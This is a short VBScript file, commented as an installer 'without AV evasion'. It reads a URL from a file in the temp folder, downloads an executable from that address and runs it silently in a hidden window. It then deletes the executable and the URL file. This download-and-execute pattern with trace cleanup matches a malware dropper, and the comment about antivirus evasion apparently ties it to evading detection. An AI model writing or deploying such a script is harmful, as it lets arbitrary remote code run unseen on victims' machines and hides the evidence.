' Simple installer without AV evasion
Dim objShell, objFSO, urlFile, installerPath, downloadUrl

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Read URL from file
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
urlFile = tempPath & "\download_url.txt"
installerPath = tempPath & "\installer.exe"

' Check if URL file exists
If Not objFSO.FileExists(urlFile) Then
    MsgBox "URL file not found", vbCritical
    WScript.Quit
End If

' Read URL
Set objFile = objFSO.OpenTextFile(urlFile, 1)
downloadUrl = objFile.ReadAll
objFile.Close

' Download using XMLHTTP
Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")
objHTTP.Open "GET", downloadUrl, False
objHTTP.Send

' Check for redirect
If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
    finalUrl = objHTTP.getResponseHeader("Location")
    objHTTP.Open "GET", finalUrl, False
    objHTTP.Send
End If

' Save file if successful
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile installerPath, 2
    objStream.Close
    
    ' Run installer
    objShell.Run """" & installerPath & """ /S", 0, True
    
    ' Clean up
    objFSO.DeleteFile installerPath, True
    objFSO.DeleteFile urlFile, True
Else
    MsgBox "Download failed with status: " & objHTTP.Status, vbCritical
End If
